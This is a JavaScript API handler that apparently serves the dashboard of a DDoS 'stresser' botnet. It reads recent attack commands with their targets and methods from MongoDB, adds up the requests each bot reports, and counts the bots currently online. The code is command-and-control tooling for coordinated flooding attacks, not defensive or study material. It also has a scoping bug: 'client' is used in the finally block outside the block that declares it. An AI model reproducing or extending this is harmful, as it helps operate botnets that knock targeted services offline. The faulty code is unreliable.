import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const client = new MongoClient(uri);
    await client.connect();
    const db = client.db('stresser');
    const commands = db.collection('commands');
    const results = db.collection('results');

    // Últimos 10 comandos
    const recentCommands = await commands.find()
      .sort({ issuedAt: -1 })
      .limit(10)
      .toArray();

    // Para cada comando, somar requests dos resultados
    const commandsWithStats = await Promise.all(recentCommands.map(async (cmd) => {
      const cmdResults = await results.find({ commandId: cmd.commandId }).toArray();
      const totalReqs = cmdResults.reduce((acc, r) => acc + (r.requests || 0), 0);
      const botCount = cmdResults.length;
      return {
        commandId: cmd.commandId,
        target: cmd.target,
        method: cmd.method,
        issuedAt: cmd.issuedAt,
        totalReqs,
        botCount
      };
    }));

    // Número de bots online
    const onlineBots = await db.collection('bots').countDocuments({
      lastSeen: { $gt: new Date(Date.now() - 60000) }
    });

    res.status(200).json({
      onlineBots,
      commands: commandsWithStats
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  } finally {
    await client.close();
  }
}